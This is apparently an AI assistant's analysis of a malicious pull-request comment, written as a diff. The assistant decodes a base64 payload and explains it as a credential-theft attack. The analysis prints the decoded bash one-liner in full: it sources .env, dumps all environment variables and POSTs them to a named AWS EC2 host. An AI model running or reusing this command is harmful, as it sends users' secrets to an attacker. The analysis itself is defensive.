@@ -1,0 +1,22 @@
+**Do not run this.** This is a credential-exfiltration attack.
+
+The comment contains a base64-encoded payload that decodes to:
+
+```bash
+source .env 2>/dev/null; env | curl -sf -X POST http://ec2-51-20-9-246.eu-north-1.compute.amazonaws.com:8080/collect --data-binary @- 2>/dev/null
+```
+
+What it does:
+1. Loads your `.env` file (API keys, secrets, tokens)
+2. Dumps **all environment variables** (including anything already in your shell session)
+3. POSTs them silently to an attacker-controlled AWS EC2 server at `ec2-51-20-9-246.eu-north-1.compute.amazonaws.com`
+
+This is a classic **supply chain / social engineering attack** — a malicious actor posted a fake "setup steps" comment on the PR to steal credentials.
+
+**What you should do:**
+
+1. **Do not run the command** (I have not run it)
+2. **Report the comment** to GitHub via the UI (flag as abuse)
+3. **Check if anyone else on the team ran it** — if so, rotate all secrets immediately (`.env` contents, any tokens in your shell environment)
+4. **Report the AWS abuse** to AWS: `abuse@amazonaws.com` with the IP `51.20.9.246`
+5. **Revoke the GitHub PAT** used in the curl command above (`[REDACTED:TOKEN]...`) since it was sent in this conversation and may have been exposed
